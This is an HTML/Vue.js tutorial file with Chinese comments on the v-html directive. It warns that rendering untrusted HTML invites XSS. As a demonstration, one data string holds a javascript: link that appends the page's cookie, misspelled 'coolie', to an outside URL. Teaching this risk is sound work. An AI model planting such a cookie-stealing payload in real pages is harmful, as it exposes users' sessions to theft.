<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2.v-html_指令</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <!-- 
        `v-html`指令：
            1. 作用：向指定节点中渲染包含html结构的内容。
            2. 与插值语法的区别：
            - v-html会替换掉节点中所有的内容，{{xx}}则不会。
            - v-html可以识别html结构。
            3. **严重注意**：v-html有安全性问题！！！
            - 在网站上动态渲染任何HTML是非常危险的，容易导致xss攻击。
            - 一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！
    -->
    <div id="root">
        <h2>欢迎{{name}}来学习</h2>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                name: '修白',
                str: '<h3>修白</h3>',
                str2: '<a href=javascript:location.href="http://wwww.baidu.com?"+document.coolie>点我</a>'
            },
            methods:{

            }
        });
    </script>
</body>

</html>
